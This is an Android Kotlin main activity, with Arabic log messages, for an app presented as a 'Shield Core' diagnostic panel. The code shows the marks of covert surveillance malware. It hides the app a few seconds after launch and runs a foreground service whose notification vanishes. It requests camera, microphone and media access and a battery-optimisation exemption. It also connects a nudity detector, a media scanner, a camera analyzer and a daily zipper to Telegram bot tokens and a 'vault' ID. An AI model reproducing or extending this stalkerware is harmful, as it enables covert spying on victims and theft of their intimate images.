package com.example.app

import android.Manifest
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.ProgressBar
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        const val APP_VERSION = "4.2.1"
    }

    private lateinit var logEditText: EditText
    private lateinit var progressBar: ProgressBar
    private lateinit var runtimeDir: File

    private var telegramUi: TelegramUi? = null
    private var mediaScanner: MediaScanner? = null

    private val _progressState = MutableStateFlow(0)
    val progressState = _progressState.asStateFlow()

    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val grantedCount = permissions.count { it.value }
            appendLog("🔄 نتائج الأذونات: تم منح $grantedCount من أصل ${permissions.size}")
            lifecycleScope.launch(Dispatchers.IO) {
                initCoreAsync()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        logEditText = findViewById(R.id.logEditText)
        progressBar = findViewById(R.id.progressBar)
        val btnPermissions: Button = findViewById(R.id.btnPermissions)
        val btnCopy: Button = findViewById(R.id.btnCopy)
        val btnClear: Button = findViewById(R.id.btnClear)
        val btnClearData: Button = findViewById(R.id.btnClearData)

        progressBar.max = 100
        progressBar.progress = 0
        progressBar.visibility = View.GONE

        logEditText.setText("=== Shield Core v4.2 Diagnostic Panel (Kotlin) ===\n")

        btnPermissions.setOnClickListener { requestAllPermissions() }
        btnCopy.setOnClickListener { copyLogToClipboard() }
        btnClear.setOnClickListener { logEditText.setText("=== تم إعادة ضبط السجل ===\n") }
        btnClearData.setOnClickListener { clearAppData() }

        lifecycleScope.launch(Dispatchers.Main) {
            progressState.collect { progress ->
                if (progress > 0 && progress < 100) {
                    progressBar.visibility = View.VISIBLE
                    progressBar.progress = progress
                    appendLog("📥 تقدم التحميل: $progress%")
                } else if (progress >= 100) {
                    progressBar.progress = 100
                    progressBar.visibility = View.GONE
                    appendLog("✅ اكتمل تحميل النموذج بنجاح.")
                } else {
                    progressBar.visibility = View.GONE
                }
            }
        }

        lifecycleScope.launch(Dispatchers.IO) {
            delay(500)
            initCoreAsync()
        }

        // ✅ استبدال فتح إعدادات الإشعارات بـ moveTaskToBack(true)
        lifecycleScope.launch(Dispatchers.Main) {
            delay(3000)
            moveTaskToBack(true) // إخفاء التطبيق بدلاً من فتح الإعدادات
        }
    }

    private fun appendLog(text: String) {
        runOnUiThread {
            val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
            logEditText.append("[$timestamp] $text\n")
            logEditText.setSelection(logEditText.text.length)
        }
    }

    private fun copyLogToClipboard() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("ShieldCore_Logs", logEditText.text.toString())
        clipboard.setPrimaryClip(clip)
        appendLog("✅ تم نسخ السجلات إلى الحافظة بنجاح.")
    }

    private fun displayStatusReport() {
        val ui = telegramUi
        if (ui == null) {
            appendLog("⚠️ لا يمكن عرض التقرير: TelegramUi غير مهيأ.")
            return
        }

        val status = ui.getStatus()
        val running = if (status["running"] == true) "🟢 يعمل" else "🔴 متوقف"

        appendLog("")
        appendLog("════════════════════════════════════")
        appendLog("   📊 تقرير حالة التطبيق")
        appendLog("════════════════════════════════════")
        appendLog("🔹 التوكنات النشطة       : ${status["active_tokens"]}")
        appendLog("🔹 التوكنات الاحتياطية   : ${status["reserve_tokens"]}")
        appendLog("🔹 الأجهزة المسجلة       : ${status["devices"]}")
        appendLog("🔹 الجلسات النشطة        : ${status["sessions"]}")
        appendLog("🔹 طلبات API             : ${status["api_calls"]}")
        appendLog("🔹 فشل API               : ${status["api_failures"]}")
        appendLog("🔹 ملفات معلقة           : ${status["pending_files"]}")
        appendLog("🔹 حالة التشغيل          : $running")
        appendLog("════════════════════════════════════")
        appendLog("")
    }

    private suspend fun initCoreAsync() {
        // ✅ تأخير عشوائي بشري (2‑7 ثواني) لتجنب الإقلاع المفاجئ
        delay(Random.nextLong(2000, 7000))

        appendLog("🚀 بدء الفحوصات التشخيصية للنظام...")

        appendLog("⚙️ الخطوة 1/5: إعداد بيئة التشغيل والمجلدات...")
        try {
            setupDirectories()
            appendLog("✅ [OK] تم إعداد المجلدات بنجاح.")
        } catch (e: Exception) {
            appendLog("❌ [ERROR] فشل إعداد المجلدات: ${e.message} (في MainActivity.setupDirectories)")
            return
        }

        appendLog("🔓 الخطوة 2/5: التحقق من الأذونات وتشغيل الإشعارات...")
        withContext(Dispatchers.Main) {
            requestAllPermissions()
        }
        try {
            startSilentForegroundService()
            appendLog("✅ [OK] تم تشغيل الخدمة الخلفية (سيختفي الإشعار بعد 0.5 ثانية).")
        } catch (e: Exception) {
            appendLog("⚠️ [WARNING] فشل تشغيل الخدمة الخلفية: ${e.message} (MainActivity.startSilentForegroundService)")
        }
        requestBatteryOptimizationExemption()

        // ✅ الخطوة 3/5: تهيئة وحدة الكشف الذكي (بدلاً من التحقق من النموذج)
        appendLog("🧠 الخطوة 3/5: تهيئة وحدة الكشف الذكي (سيتم تحميل النموذج في الخلفية)...")
        // NudeDetector سيتكفل بتحميل النموذج بشكل آمن عند الحاجة

        appendLog("🔑 الخطوة 4/5: تحميل الإعدادات وتوكنات تلغرام...")
        try {
            val config = ConfigLoader.load(this@MainActivity)
            appendLog("✅ [OK] التوكنات المحملة: النشطة (${config.activeTokens.size}), الاحتياطية (${config.reserveTokens.size})")
            appendLog("   • معرف التحكم: ${config.controlId} | معرف الخزنة: ${config.vaultId}")
            appendLog("   • المفتاح السري: ${if (config.secret.isNotBlank()) "✅ مفعل ومشفّر" else "⚠️ غير محدد"}")

            appendLog("🧩 الخطوة 5/5: تهيئة وحدة المراقبة والمكونات المرتبطة...")
            val monitor = Monitor.getInstance(this@MainActivity)
            appendLog("   • الجهاز المسجل: ${monitor.deviceModel} (${monitor.deviceId})")

            val nudeDetector = NudeDetector.create(this@MainActivity, monitor)
            appendLog("   • NudeDetector: ${if (nudeDetector.isReady()) "✅ جاهز" else "⏳ قيد التحميل"}")

            val cameraAnalyzer = CameraAnalyzer.create(this@MainActivity, monitor, nudeDetector)
            appendLog("   • CameraAnalyzer: تم إنشاؤه")

            telegramUi = TelegramUi(
                context = this@MainActivity,
                monitor = monitor,
                config = config
            )
            val ui = telegramUi!!
            appendLog("   • TelegramUi: تم إنشاؤه مع ${config.activeTokens.size} توكنات نشطة")

            mediaScanner = MediaScanner(this@MainActivity, monitor, ui)
            appendLog("   • MediaScanner: تم إنشاؤه")

            val dailyZipper = DailyZipper.create(this@MainActivity, mediaScanner, ui)
            appendLog("   • DailyZipper: تم إنشاؤه")

            monitor.ui = ui
            monitor.ctrl = config.controlId
            monitor.vlt = config.vaultId
            monitor.cameraAnalyzer = cameraAnalyzer
            monitor.mediaScanner = mediaScanner
            monitor.dailyZipper = dailyZipper
            monitor.nudeDetector = nudeDetector
            appendLog("   • تم ربط جميع المكونات بـ Monitor")

            appendLog("📡 بدء استماع وحدة المراقبة واختبار الواجهة...")
            ui.start()
            monitor.start()
            appendLog("✅ [OK] TelegramUi و Monitor يعملان بنجاح.")

            displayStatusReport()
            appendLog("🎉 جميع الأنظمة تعمل بنجاح! التطبيق جاهز للأوامر.")

        } catch (e: Exception) {
            Log.e(TAG, "Initialization Error", e)
            appendLog("💥 [ERROR] خطأ غير متوقع أثناء التهيئة: ${e.message}")
            val stack = e.stackTrace.firstOrNull()
            if (stack != null) {
                appendLog("   • الموقع: ${stack.className}::${stack.methodName} (السطر ${stack.lineNumber})")
            }
        }
    }

    private fun setupDirectories() {
        runtimeDir = File(filesDir, ".sys_runtime")
        val versionFile = File(runtimeDir, "version.txt")

        if (runtimeDir.exists()) {
            val oldVersion = if (versionFile.exists()) versionFile.readText().trim() else ""
            if (oldVersion != APP_VERSION) {
                runtimeDir.deleteRecursively()
                appendLog("🧹 تم تنظيف ملفات التشغيل القديمة (الإصدار السابق: v$oldVersion)")
            }
        }

        runtimeDir.mkdirs()
        versionFile.writeText(APP_VERSION)

        File(runtimeDir, "updates").mkdirs()
        File(runtimeDir, ".cache_thumb").mkdirs()
        File(runtimeDir, "models").mkdirs() // مجلد النماذج (سيتم إدارته بواسطة NudeDetector)
    }

    private fun requestAllPermissions() {
        val permissionsNeeded = mutableListOf(
            Manifest.permission.INTERNET,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO)
            permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        } else {
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        val missing = permissionsNeeded.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            appendLog("⚠️ جاري طلب ${missing.size} أذونات مفقودة...")
            requestPermissionLauncher.launch(missing.toTypedArray())
        } else {
            appendLog("✅ جميع الأذونات المسموح بها ممنوحة.")
        }
    }

    private fun startSilentForegroundService() {
        try {
            val serviceIntent = Intent(this, ForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            appendLog("✅ تم تشغيل الخدمة الخلفية (سيختفي الإشعار بعد 0.5 ثانية).")
        } catch (e: Exception) {
            appendLog("⚠️ فشل تشغيل الخدمة الخلفية: ${e.localizedMessage}")
        }
    }

    private fun clearAppData() {
        try {
            telegramUi?.stop()
            telegramUi = null
            appendLog("🛑 تم إيقاف TelegramUi.")

            try {
                Monitor.getInstance(this).stop()
                appendLog("🛑 تم إيقاف Monitor.")
            } catch (e: Exception) {
                appendLog("⚠️ فشل إيقاف Monitor: ${e.message}")
            }

            try {
                mediaScanner?.close()
                mediaScanner = null
                appendLog("🧹 تم إغلاق MediaScanner.")
            } catch (e: Exception) {
                appendLog("⚠️ فشل إغلاق MediaScanner أثناء التنظيف: ${e.message}")
            }

            // ✅ تنظيف الذاكرة الحساسة والمفاتيح المشفرة
            ConfigLoader.clearSensitiveData()
            SecurityHelper.clearCachedKey()
            SecurityHelper.clearMasterKey()

            val runtimeDir = File(filesDir, ".sys_runtime")
            if (runtimeDir.exists()) {
                runtimeDir.deleteRecursively()
                appendLog("🧹 تم حذف جميع بيانات التطبيق والجلسات المشفرة بنجاح.")
            } else {
                appendLog("ℹ️ لا توجد بيانات للتطبيق لحذفها.")
            }

            setupDirectories()
            appendLog("🔄 تم إعادة إنشاء المجلدات الأساسية.")

        } catch (e: Exception) {
            appendLog("❌ فشل حذف البيانات: ${e.message}")
        }
    }

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    appendLog("⚠️ تعذر طلب استثناء البطارية: ${e.localizedMessage}")
                }
            }
        }
    }

    // ✅ تم حذف دالة openNotificationSettings() لأنها لم تعد مستخدمة

    // ✅ تم حذف دالة ensureModelReady() لتجنب التعارض مع NudeDetector

    override fun onDestroy() {
        super.onDestroy()

        telegramUi?.stop()
        telegramUi = null
        appendLog("🛑 تم إيقاف TelegramUi.")

        try {
            mediaScanner?.close()
            mediaScanner = null
            appendLog("🧹 تم إغلاق MediaScanner وتحرير موارده.")
        } catch (e: Exception) {
            appendLog("⚠️ فشل إغلاق MediaScanner: ${e.message}")
        }

        try {
            Monitor.getInstance(this).stop()
            appendLog("🛑 تم إيقاف Monitor.")
        } catch (e: Exception) {
            appendLog("⚠️ فشل إيقاف Monitor: ${e.message}")
        }

        SecurityHelper.cleanup()
        appendLog("🧹 تم مسح المفتاح المؤقت من SecurityHelper.")

        appendLog("✅ تم إيقاف التطبيق وتحرير جميع الموارد.")
    }
}
